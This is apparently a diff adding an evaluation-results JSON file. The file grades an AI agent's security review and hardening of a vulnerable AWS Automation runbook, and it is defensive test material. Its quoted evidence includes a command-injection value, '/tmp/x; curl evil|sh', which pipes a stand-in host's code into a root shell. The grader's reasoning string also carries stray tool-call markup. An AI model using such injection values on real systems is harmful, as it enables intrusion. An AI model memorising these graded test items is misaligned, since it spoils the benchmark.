@@ -1,0 +1,118 @@
+{
+  "version": "v1",
+  "iteration": 3,
+  "eval_id": "auto-harden-vulnerable",
+  "run_type": "without_skill",
+  "success": true,
+  "error": null,
+  "understanding_agent_space_skill": null,
+  "tests": {
+    "trigger": null,
+    "expected_output": {
+      "result": "failed",
+      "reasoning": "The agent correctly identified several of the expected issues: LogPath command injection with weak '.*' pattern (critical), DbPassword as SecureString being echoed (critical), missing InstanceId pattern, curl -k TLS issue, hard-coded assumeRole, and onFailure: Continue on RotateLogs. However, it missed two specific required findings: (1) timeoutSeconds: 1200 exceeding the 600-second maximum for aws:executeScript \u2014 the agent flagged the timeout as \"too long\" generically but never cited the specific 600-second maximum violation; and (2) onCancel: step:Wait being an invalid cancel target for aws:sleep \u2014 the agent called this \"pointless\" but did not state it was actually invalid/not a permitted cancel target (the expected output specifically says it isn't a valid cancel target, implying a technical invalidity, not just poor design). Additionally, in the hardened version, the timeout was changed to 300s/120s/60s rather than 600s as expected, and onCancel was simply removed rather than explicitly 'fixed' to a valid target (e.g., Abort) with explanation. The agent also introduced a Secrets Manager/Parameter Store suggestion only as a comment, not as an actual implemented 'name parameter read at run time' within the hardened YAML. These are meaningful gaps against the detailed expected criteria, which explicitly calls out the 600s max and onCancel validity, and a concrete Parameter Store parameter in the hardened doc, none of which were fulfilled as specified.</reasoning>\n<parameter name=\"evidence\">\"timeoutSeconds: 1200 on a trivial call... The timeout is far too long\" (no mention of 600s max) and \"onCancel: step:Wait... Routing a cancel to a sleep step is pointless\" (not stated as invalid) ; hardened YAML sets timeoutSeconds: 60 and removes onCancel entirely rather than fixing to 600/Abort; DbPassword removed entirely rather than replaced with a Parameter Store name parameter in the YAML.",
+      "confidence": "medium"
+    },
+    "assertions": {
+      "assertion_results": [
+        {
+          "text": "Flags LogPath as a command-injection risk because its pattern is '.*' and it is interpolated into a shell command",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #1: \"`LogPath` has `allowedPattern: '.*'` and is substituted straight into a root shell command | Anyone who can start the runbook gets root command execution on the target. A value like `/tmp/x; curl evil|sh` works.\"",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags SecureString as an invalid parameter type and recommends taking the Parameter Store parameter name instead",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "The agent says: \"SecureString is not a parameter type I could confirm for Automation runbooks... As I recall, Automation supports String, StringList, Boolean, Integer, MapList and StringMap.\" It flags it as unconfirmed/uncertain rather than definitively invalid, and does not recommend taking the Parameter Store parameter name instead \u2014 instead it removes DbPassword entirely and recommends the instance fetch it at runtime from Secrets Manager/Parameter Store using its instance profile, not passing the parameter name into the runbook.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the echo of DbPassword as exposing a secret",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #2: \"echo \\\"restarting with password {{DbPassword}}\\\" | The password lands in the command document, command output, the Run Command history, any CloudWatch or S3 output logging, and the shell's process list.\"",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags curl -k as disabling TLS verification",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #5: \"`curl -k` | It disables TLS verification, so anyone on the network path can intercept or spoof the notify call.\"",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags the hard-coded assumeRole ARN",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #3: \"`assumeRole` is hardcoded to `AppOpsRole` | Anyone allowed to start this runbook runs with that role's permissions, whatever their own access.\"",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags timeoutSeconds 1200 as above the aws:executeScript maximum of 600 seconds",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "Finding #9 only says: \"`timeoutSeconds: 1200` on a trivial call... The timeout is far too long.\" It never mentions a specific maximum of 600 seconds for aws:executeScript, nor states that 1200 exceeds that limit.",
+          "confidence": "high"
+        },
+        {
+          "text": "Flags onCancel routing to an aws:sleep step as invalid",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "Finding #9: \"Routing a cancel to a sleep step is pointless, and `Abort` is the right behavior.\" This flags onCancel: step:Wait as invalid/wrong.",
+          "confidence": "high"
+        },
+        {
+          "text": "Returns a complete hardened document in YAML",
+          "evaluator": "llm",
+          "passed": true,
+          "evidence": "The output contains a full YAML document under 'Hardened runbook' with schemaVersion, parameters, and five mainSteps (RotateLogs, RestartService, Wait, CheckHealth, NotifyComplete) fully specified.",
+          "confidence": "high"
+        },
+        {
+          "text": "Cites a documentation page for findings",
+          "evaluator": "llm",
+          "passed": false,
+          "evidence": "The agent explicitly states it could not find documentation: \"My doc lookup didn't return the type list, so please check it.\" No documentation page URL or citation is given anywhere in the output.",
+          "confidence": "high"
+        },
+        {
+          "text": "The instance ID pattern is applied",
+          "evaluator": "regex",
+          "passed": false,
+          "evidence": "Pattern not found in the output"
+        },
+        {
+          "text": "The executeScript timeout is lowered to 600",
+          "evaluator": "regex",
+          "passed": false,
+          "evidence": "Pattern not found in the output"
+        },
+        {
+          "text": "No raw 12-digit account ID other than the documentation example is exposed",
+          "evaluator": "regex",
+          "passed": true,
+          "evidence": "Pattern not found in the output"
+        }
+      ],
+      "summary": {
+        "passed": 7,
+        "failed": 5,
+        "errored": 0,
+        "low_confidence": 0,
+        "total": 12,
+        "pass_rate": 0.5833
+      }
+    }
+  },
+  "metrics": {
+    "runtime": "49s",
+    "cost": "$0.41",
+    "context_window": {
+      "utilization": "4.6%",
+      "compaction_count": 0
+    }
+  }
+}
